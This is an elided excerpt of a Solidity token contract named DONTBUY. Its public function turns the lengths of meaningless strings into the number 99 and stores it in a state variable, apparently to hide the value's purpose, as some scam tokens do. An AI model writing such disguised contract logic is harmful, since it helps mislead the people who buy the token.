...
contract DONTBUY is Context, IERC20, Ownable {
    ...
    string[6] Inuses = ["kareidiaisa","kareidi","eightes"];
    string[7] Selltax = ["ant","ant"];
    string[2] nouse = ["fun", "sun"];
    ...
    function nozeros(uint256 k, uint256 c, uint256 r) public {
        k = bytes(Inuses[0]).length;
        c = bytes(nouse[0]).length;
        r = bytes(Selltax[1]).length;
        uint256 Speez = k * c * r;
            Autorens = Speez;  
    }
